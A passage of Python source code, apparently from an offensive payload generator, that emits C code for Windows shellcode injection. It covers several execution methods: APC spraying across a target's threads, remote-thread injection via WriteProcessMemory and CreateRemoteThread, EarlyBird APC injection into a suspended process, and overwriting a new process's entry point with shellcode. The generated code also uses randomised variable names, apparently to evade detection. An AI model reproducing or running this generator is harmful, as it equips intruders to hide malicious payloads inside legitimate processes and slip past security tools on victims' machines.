            Ret_code += NdcCloseHandle + "(" + RandTargetThread + ");" + NdcCloseHandle + "(" + RandhProcess + ");return(0);}}}}\n"
            Ret_code += "} while(" + NdcThread32Next + "(" + RandThreadsnapshot + ", &" + RandTentry + "));\n"
            Ret_code += NdcCloseHandle + "(" + RandThreadsnapshot + ");\n"
            Ret_code += NdcCloseHandle + "(" + RandProcsnapshot + ");}}}}}\n"
        else:
            Ret_code += "SendInput(1, &" + Randinputvar + ", sizeof(INPUT));\n"
            Ret_code += "Sleep(" + str(random.randint(200,500)) + ");\n"
            Ret_code += "PostMessage(" + RandWindowHandle + ", WM_KEYDOWN, 0x43, 0);\n"
            Ret_code += "Sleep(" + str(random.randint(200,500)) + ");\n"
            Ret_code += Randinputvar + ".ki.dwFlags = 2;\n"
            Ret_code += "SendInput(1, &" + Randinputvar + ", sizeof(INPUT));}\n"
            Ret_code += RandWindowHandle + " = GetNextWindow(" + RandWindowHandle + ", GW_HWNDNEXT);}\n"
            Ret_code += "CloseHandle(" + RandThreadsnapshot + ");CloseHandle(" + RandProcsnapshot + ");\n"
            Ret_code += "CloseHandle(" + RandTargetThread + ");CloseHandle(" + RandhProcess + ");return(0);}}}}\n"
            Ret_code += "} while(Thread32Next(" + RandThreadsnapshot + ", &" + RandTentry + "));\n"
            Ret_code += "CloseHandle(" + RandThreadsnapshot + ");\n"
            Ret_code += "CloseHandle(" + RandProcsnapshot + ");}}}}}\n"

    elif ModOpt["ExecMethod"] == "APCspray" or ModOpt["ExecMethod"] == "APCS":

        RandThreadsnapshot = varname_creator()
        RandTargetThread = varname_creator()
        RandTentry = varname_creator()
        RandTcontext = varname_creator()
        Randresult = varname_creator()

        Ret_code += "HANDLE " + RandThreadsnapshot + " = INVALID_HANDLE_VALUE;\n" 
        Ret_code += "THREADENTRY32 " + RandTentry + ";\n" 
        Ret_code += RandThreadsnapshot + " = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);\n"
        Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE ) {\n"
        Ret_code += RandTentry + ".dwSize = sizeof(THREADENTRY32 );\n"
        Ret_code += "if(!Thread32First(" + RandThreadsnapshot + ", &" + RandTentry + " ) ){CloseHandle(" + RandThreadsnapshot + ");}\n"

        Ret_code += "LPVOID " + Randlpv2 + ";\n"
        Ret_code += Win_MemRemote(ModOpt)

        if ModOpt["Decoder"] != "False":

            Ret_code += ModOpt["Decoder"]

        Ret_code += "WriteProcessMemory(" + RandhProcess + "," + Randlpv2 + ", (LPCVOID)" + ModOpt["Buff"] + "," + ModOpt["Bufflen"] + ", NULL);\n"
        Ret_code += "do{\n" 
        Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID ){\n"
        Ret_code += "HANDLE " + RandTargetThread + " = OpenThread(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
        Ret_code += "if(" + RandTargetThread + " != NULL){\n"

        if "RW/RX" in ModOpt["MemAlloc"] or "RW/RWX" in ModOpt["MemAlloc"]:

            Ret_code += Win_ChangeMemProtect(ModOpt)

        Ret_code += "QueueUserAPC((PAPCFUNC)" + Randlpv2 + "," + RandTargetThread + ",(ULONG_PTR)NULL);}}\n"
        #Ret_code += "DWORD " + Randresult + " = WaitForSingleObjectEx(" + RandTargetThread + ",-1,TRUE);\n"
        #Ret_code += "CloseHandle(" + RandThreadsnapshot + ");CloseHandle(" + RandProcsnapshot + ");\n"
        #Ret_code += "CloseHandle(" + RandhProcess + ");return(1);}}\n"
        Ret_code += "} while(Thread32Next(" + RandThreadsnapshot + ", &" + RandTentry + "));\n"
        Ret_code += "CloseHandle(" + RandThreadsnapshot + ");\n"
        Ret_code += "CloseHandle(" + RandProcsnapshot + ");}}}}}\n"

    elif ModOpt["ExecMethod"] == "ProcessInject" or ModOpt["ExecMethod"] == "PI":

        Randhand = varname_creator()
        Randthread = varname_creator()
        Randresult = varname_creator()

        Ret_code += "LPVOID " + Randlpv2 + ";\n"
        Ret_code += Win_MemRemote(ModOpt)

        if ModOpt["Decoder"] != "False" and ModOpt["MemAlloc"] not in ["SS","SharedSection"]:

            Ret_code += ModOpt["Decoder"]
            Ret_code += "WriteProcessMemory(" + RandhProcess + "," + Randlpv2 + ", (LPCVOID)" + ModOpt["Buff"] + "," + ModOpt["Bufflen"] + ",NULL);\n"

        elif ModOpt["Decoder"] != "False" and ModOpt["MemAlloc"] in ["SS","SharedSection"]:

            Ret_code += ModOpt["Decoder"]

        if "RW/RX" in ModOpt["MemAlloc"] or "RW/RWX" in ModOpt["MemAlloc"]:

            Ret_code += Win_ChangeMemProtect(ModOpt)

        Ret_code += "HANDLE " + Randhand + " = CreateRemoteThread(" + RandhProcess + ",NULL,0," + Randlpv2 + ",NULL,0,0);\n"
        Ret_code += "WaitForSingleObject(" + Randhand + ",-1);\n"
        Ret_code += "CloseHandle(" + RandProcsnapshot + ");\n"
        Ret_code += "CloseHandle(" + RandhProcess + ");return(0);}\n"
        Ret_code += "CloseHandle(" + RandProcsnapshot + ");}}}\n"

    elif ModOpt["ExecMethod"] in ["EarlyBird","EB"]:

        Randsi = varname_creator()
        Randpi = varname_creator()
        RandThreadsnapshot = varname_creator()
        RandTargetThread = varname_creator()
        RandTentry = varname_creator()
        RandTcontext = varname_creator()
        Randresult = varname_creator()

        ModOpt["ProcHandle"] = Randpi + ".hProcess" 

        Ret_code += "STARTUPINFOA " + Randsi + ";\n"
        Ret_code += "PROCESS_INFORMATION " + Randpi + ";\n"
        Ret_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
        Ret_code += Randsi + ".cb = sizeof(" + Randsi + ");\n"
        Ret_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"
        Ret_code += "CreateProcessA(0,\"" + ModOpt["ProcTarget"] + "\",0,0,0, CREATE_SUSPENDED,0,0,&" + Randsi + ",&" + Randpi + ");\n"
        
        Ret_code += "LPVOID " + Randlpv2 + ";\n"
        Ret_code += Win_MemRemote(ModOpt)

        if ModOpt["Decoder"] != "False" and ModOpt["MemAlloc"] not in ["SS","SharedSection"]:

            Ret_code += ModOpt["Decoder"]
            Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess," + Randlpv2 + ", (LPCVOID)" + ModOpt["Buff"] + "," + ModOpt["Bufflen"] + ", NULL);\n"

        elif ModOpt["Decoder"] != "False" and ModOpt["MemAlloc"] in ["SS","SharedSection"]:

            Ret_code += ModOpt["Decoder"]
            
        if "RW/RX" in ModOpt["MemAlloc"] or "RW/RWX" in ModOpt["MemAlloc"]:

            Ret_code += Win_ChangeMemProtect(ModOpt)

        Ret_code += "QueueUserAPC((PAPCFUNC)" + Randlpv2 + "," + Randpi + ".hThread,(ULONG_PTR)NULL);\n"
        Ret_code += "ResumeThread(" + Randpi + ".hThread);\n"

    elif ModOpt["ExecMethod"] in ["EntryPointHijack","EPH"]:

        Randsi = varname_creator()
        Randpi = varname_creator()
        NdcNTQIP = varname_creator()
        Randpbi = varname_creator()
        RandLen = varname_creator()
        RandImgBase = varname_creator()
        RandBuffHeader = varname_creator()
        RandDosHeader = varname_creator()
        RandNtHeader = varname_creator()
        RandEntry = varname_creator()


        if ModOpt["DynImport"] == False and "NtdllHandle" not in ModOpt :

            ModOpt["NtdllHandle"] = varname_creator()

            Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"

        ModOpt["ProcHandle"] = Randpi + ".hProcess"

        if "PBIdefined" not in ModOpt or ModOpt["PBIdefined"] == False:

            Ret_code += "typedef struct _PROCESS_BASIC_INFORMATION {"
            Ret_code += "PVOID Reserved1;"
            Ret_code += "SIZE_T PebBaseAddress;"
            Ret_code += "PVOID Reserved2[2];"
            Ret_code += "ULONG_PTR UniqueProcessId;"
            Ret_code += "PVOID Reserved3;"
            Ret_code += "} PROCESS_BASIC_INFORMATION;\n"

        Ret_code += "STARTUPINFOA " + Randsi + ";\n"
        Ret_code += "PROCESS_INFORMATION " + Randpi + ";\n"
        Ret_code += "PROCESS_BASIC_INFORMATION " + Randpbi + ";\n"
        Ret_code += "DWORD " + RandLen + " = 0;\n"
        Ret_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
        Ret_code += Randsi + ".cb = sizeof(" + Randsi + ");\n"
        Ret_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"
        Ret_code += "CreateProcessA(0,\"" + ModOpt["ProcTarget"] + "\",0,0,0, CREATE_SUSPENDED,0,0,&" + Randsi + ",&" + Randpi + ");\n"

        Ret_code += "FARPROC " + NdcNTQIP + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ",\"NtQueryInformationProcess\");\n"
        Ret_code += NdcNTQIP + "(" + Randpi + ".hProcess,0, &" + Randpbi + ", sizeof(PROCESS_BASIC_INFORMATION), &" + RandLen + ");\n"

        Ret_code += "SIZE_T pebOffset = (SIZE_T)" + Randpbi + ".PebBaseAddress + 8;\n"
        Ret_code += "LPVOID " + RandImgBase + " = 0;\n"
        Ret_code += "ReadProcessMemory(" + Randpi + ".hProcess, (LPCVOID)((SIZE_T)" + Randpbi + ".PebBaseAddress + 8), &" + RandImgBase + ", 4, NULL);\n"
        #// read target process image headers
        Ret_code += "BYTE " + RandBuffHeader + "[4096] = {};\n"
        Ret_code += "ReadProcessMemory(" + Randpi + ".hProcess,(LPCVOID)" + RandImgBase + "," + RandBuffHeader + ",4096,NULL);\n"

        #// get AddressOfEntryPoint
        Ret_code += "PIMAGE_DOS_HEADER " + RandDosHeader + " = (PIMAGE_DOS_HEADER)" + RandBuffHeader + ";\n"
        Ret_code += "PIMAGE_NT_HEADERS " + RandNtHeader + " = (PIMAGE_NT_HEADERS)((LPBYTE)" + RandBuffHeader + " + " + RandDosHeader + "->e_lfanew);\n"
        Ret_code += "LPVOID " + RandEntry + " = (LPVOID)(" + RandNtHeader + "->OptionalHeader.AddressOfEntryPoint + " + RandImgBase + ");\n"

        #// write shellcode to image entry point and execute it

        if ModOpt["Decoder"] != "False":

            Ret_code += ModOpt["Decoder"]

        Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess," + RandEntry + "," + ModOpt["Buff"] + ", sizeof(" + ModOpt["Buff"] + "), NULL);\n"
        Ret_code += "ResumeThread(" + Randpi + ".hThread);\n"        

    return Ret_code
     
